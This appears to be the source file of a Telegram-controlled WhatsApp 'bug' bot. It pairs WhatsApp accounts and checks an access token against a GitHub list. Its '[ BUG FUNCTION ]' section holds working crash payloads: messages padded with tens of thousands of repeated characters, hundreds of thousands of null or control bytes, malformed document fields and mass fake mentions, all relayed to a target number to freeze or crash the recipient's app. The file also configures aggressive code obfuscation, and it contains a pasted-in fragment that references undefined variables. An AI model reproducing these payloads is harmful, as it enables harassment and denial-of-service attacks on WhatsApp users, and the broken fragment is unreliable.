const {
  default: makeWASocket,
  DisconnectReason,
  useMultiFileAuthState,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync('./assets/images/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./premium.json');
ensureFileExists('./admin.json');

// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./premium.json', (data) => (premiumUsers = data));
watchFile('./admin.json', (data) => (adminUsers = data));


const axios = require("axios");
const chalk = require("chalk"); // Import chalk untuk warna
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");

const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/RenData12/Aan-V4/refs/heads/main/tokens.json"; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.blue(`
⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠉⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠀⠀⠀⠀⠀⠠⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠀⠀⠀⠀⣠⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠀⠀⠀⠸⢿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡀⠀⠀⠠⠼⢛⣛⣀⣀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠋⢉⣙⡛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠀⣠⣾⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⢹⣿⡀⠀⣾⣿⣿⣷⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠀⣐⣿⡟⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠘⣿⠀⢰⣿⣿⣿⡟⢿⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣇⠀⣿⣿⣧⢹⣿⠏⠀⠀⠀⠀⠀⠀⠀⠣⠈⠀⣾⣿⣿⣿⡇⢸⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⣿⣿⣧⠀⡟⠀⠀⠀⠀⠀⠀⠠⣀⡀⣤⣾⣬⣹⣿⣿⠃⣾⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣧⢻⣿⣿⠁⠁⠈⠀⠀⠀⣀⡀⠀⠉⠁⠉⠉⠁⠈⠉⠉⠀⣧⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢸⣿⣿⡆⠸⠁⠀⡀⢠⣿⣇⠀⢻⡆⢾⣿⣿⣿⣿⣷⡆⡏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⢸⣿⣿⡇⠀⢠⣶⣧⠸⣿⣿⣶⣦⣅⢸⣿⣿⣿⣿⢬⣧⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⠈⣿⣿⠃⢀⣘⣭⣭⣤⣤⣭⠉⡛⠻⠌⢿⠿⠿⢛⣚⣛⣓⡈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⠁⢛⣡⣶⣿⣿⣿⣿⣿⣿⣿⣿⣾⡆⠀⠀⢀⣮⣿⣿⣿⣿⣿⣷⣦⣬⣝⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⡏⡴⠈⣵⣿⣿⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣌⠳⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡿⠐⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡄⢫⡻⢿⣿⣿⣿⣿⣿⣿⣿
⡟⢋⡄⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⠨⢸⣟⣿⣿⣿⣿⣿⣿
⣷⠈⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢸⣿⣿⣿⣿⣿⣿⣿
⣷⡀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣯⣿⣿⣿⣿⣿⣿
⣿⠁⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠂⣿⣿⣿⣿⣿⣿⣿
⣿⡆⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣠⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢀⣿⣿⣿⣿⣿⣿⣿
⣿⣇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢁⠀⢈⠄⢠⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣸⣿⣿⣿⣿⣿⣿⣿
⣿⡿⢈⣩⣭⣍⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣥⡾⠝⣴⣤⢢⡺⣷⣦⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡡⢡⣿⣿⣿⡿⡿⢿⣿⣿
⡟⣡⣿⣿⣿⣿⣿⣆⠉⡛⢿⣿⣿⣿⣿⣿⣿⠇⢼⣾⣿⣿⢸⢸⡿⣫⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣿⡿⢋⣵⣾⣿⣷⡙⢿
⢡⣿⣿⣿⣿⣿⣿⣿⣦⣌⠂⠈⢿⣿⣿⣿⣿⠀⣿⢿⣿⣿⣿⣸⡄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⠏⡈⠉⢀⣿⣿⣿⣿⣿⣿⡘
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⡙⢿⣿⡟⡀⣿⣿⣿⣿⣿⡙⣷⣿⣿⣿⣿⠿⢛⣛⣛⣛⠋⠄⠌⣴⣿⣿⢿⣿⣿⣿⣿⣿⠁
⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠘⠰⢸⡆⢿⠇⢰⣿⣿⣿⣿⣿⣧⢹⣿⣿⠏⣴⣾⣿⣿⣿⡏⠌⠘⢸⣿⢹⣿⢾⣿⣿⣿⣿⡿⢠
⣧⠹⣿⣿⣿⣿⣿⣿⠻⡘⠁⠀⠀⣾⣿⡈⢀⣿⣿⣿⣿⣿⣿⣿⣿⡎⣿⢋⣼⣿⣿⣿⣿⣿⠁⠀⡘⠘⣿⢸⡏⣿⣿⣿⣿⣿⠃
⣿⣇⢻⣿⣿⣿⣿⣿⣷⠀⠀⢂⣼⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⡇⣾⣿⣿⣿⣿⣿⣿⣄⠀⠑⠀⠈⢸⣗⢻⣿⣿⣿⠫⢰⣿⠀
⣿⡏⣄⢻⣿⣿⣿⣿⣿⡆⠰⢻⣿⣿⡟⠀⣾⣿⣿⣿⣿⣿⣿⣿⣇⢳⣭⣿⣿⣿⣿⣿⣿⣿⡧⠄⠀⢠⣾⢧⣿⣿⣿⣿⣦⢸⣿
⣿⢃⣏⡀⣿⣿⣿⣿⣿⣷⣤⠉⠙⠿⢁⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣬⣍⡛⠿⠟⣛⣋⣥⣶⣿⢃⣾⣿⣶⣿⣿⣿⣿⣿⡆⣿
⣿⢸⣿⣷⣿⣿⢿⣿⣿⣿⣿⣆⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣾⣿⣿⣟⣿⡟⣿⣿⣿⡇⣿
⣿⡘⣿⣿⣿⣿⣆⡛⢿⣿⣿⣿⠄⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⡍⣸⣿⣿⣿⣿⣿⣡⣿⣿⣿⠇⣿
⣿⣷⣌⣛⠿⠿⠿⠿⢛⣛⣛⣛⣊⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⣐⡛⠿⠿⠿⢓⣛⣛⣛⣛⣋⣰⣿

🤓 Masukin Dongg, eh maksudnya token kamu valid mantap`));
}

validateToken();

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Loading...`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Mennghubungkan`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Gagal Tersambung 
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤Pesan : Succes Pairing`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Pairing
╰➤ Kode : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
Статус кода сопряжения здесь
╰➤ Number  : ${botNumber} 
╰➤ Status : Erorr❌
╰➤ Pesan : ${error.message}`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}




//-# Fungsional Function Before Parameters

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}

// Get Random Image
function getRandomImage() {
  const images = [
    "https://files.catbox.moe/6ph0wo.jpg",
    "https://files.catbox.moe/9nlrgz.jpg",
    "https://files.catbox.moe/ewo5om.jpg",
    "https://files.catbox.moe/23ln1d.jpg",
    "https://files.catbox.moe/9kepdh.jpg",
    "https://files.catbox.moe/v60wr9.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldown 
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik

function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}


// ~ Enc Xopwn Confugurasi
const getVincentObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `Xopown和RenXiter无RenXiter气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};


//Conslole Log Chat Id
const log = (message, error = null) => {
    const timestamp = new Date().toISOString().replace("T", " ").replace("Z", "");
    const prefix = `\x1b[36m[ Ren Xopown ]\x1b[0m`;
    const timeStyle = `\x1b[33m[${timestamp}]\x1b[0m`;
    const msgStyle = `\x1b[32m${message}\x1b[0m`;
    console.log(`${prefix} ${timeStyle} ${msgStyle}`);
    if (error) {
        const errorStyle = `\x1b[31m✖ Error: ${error.message || error}\x1b[0m`;
        console.error(`${prefix} ${timeStyle} ${errorStyle}`);
        if (error.stack) console.error(`\x1b[90m${error.stack}\x1b[0m`);
    }
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "✅ Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_©𝙍𝙚𝙣𝙣Хороший_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}


// [ BUG FUNCTION ]

async function InvobXopown(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "*🦠-# 🗑️Vincent*",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}

> ( async () => {
let kenthu = "𐏓ᬊ‌‌🧠‌⃟𝐃𝚺𝐕𝚹𝐑𝐒𝐢𝐗𝐂𝛀𝐑𝚺 ‣ (⁠´⁠°‌‌‌‌‌‌‌‌⁠ω⁠°‌‌‌‌‌‌‌‌⁠｀⁠) #TrashdexCorp ༘ 𝗟𝗲𝗴𝗲𝗻𝗱‣⃟‌🦠"
let pregnant = "ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿".repeat(30) // angka dan isi pada string ini jangan diubah
let freesex = `\nEMAIL;TYPE=HOME,INTERNET:EMAIL@MEMEK.COM\nADR;TYPE=HOME:;;${kenthu}${pregnant};;;;`.repeat(30)
let yntkts = `\nEMAIL;TYPE=HOME,INTERNET:EMAIL@MEMEK.COM\nADR;TYPE=HOME:;;${kenthu}${"\u0000".repeat(3500)};;;;`.repeat(110)
 for (let i = 0; i < 3; i++) {
let res = await generateWAMessageFromContent(m.chat, {"contactsArrayMessage": {"displayName": kenthu, "contacts": [{"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:${kenthu}${pregnant};;;\nFN:${kenthu}${pregnant}\nORG:${kenthu}${pregnant}\nTITLE:${kenthu}${pregnant}\nTEL;TYPE=HOME,VOICE;waid=6285333831716:+62 853-3383-1716\nTEL;TYPE=CELL;waid=6285669246025:+62 856-6924-6025${freesex}${yntkts}\nLABEL;TYPE=HOME:${kenthu}${pregnant}\nEND:VCARD`}], "contextInfo": {"forwardingScore": 1, "isForwarded": true}}}, {quoted:{
key: {
remoteJid: 'p',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}, contextInfo:{ mentionedJid: [ "6285215587438@s.whatsapp.net", ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }})
await devorsix.relayMessage(m.chat, res.message, {})
}
})()

async function invob(sock, targetNumber) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [targetNumber],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: targetNumber,
                        },
                    },
                    body: {
                        text: "⿻TrashUi Redmi𖣂🦠〽" + "ꦽ".repeat(45000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await sock.relayMessage(targetNumber, message, {
        participant: {
            jid: targetNumber
        },
    });
}

async function hardbot(sock, target) {
const stanza = [
{
attrs: { biz_bot: '1' },
tag: "bot",
},
{
attrs: {},
tag: "biz",
},
];

let messagePayload = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "*⿻𝙏𝙧𝙖𝙨𝙝𝙐𝙞 𝙍𝙚𝙙𝙢𝙞 𖣂 🦠〽*" + "ꦽ".repeat(45000),
listType: 2,
singleSelectReply: {
    selectedRowId: "😸"
},
contextInfo: {
stanzaId: sock.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: [target],
quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "🩸⃟Shoyu - CRASHER ⃨〫⃰⁖ ‣—",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "༑ Fail Beta - ( devorsixcore ) \"👋\"",
                    footerText: "© running since 2020 to 20##?",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "𐎟 𝙏𝙧𝙖𝙨𝙝𝙐𝙞 𝙍𝙚𝙙𝙢𝙞͢ 𐎟"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: renlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/RenXiter",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! RenXiter - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
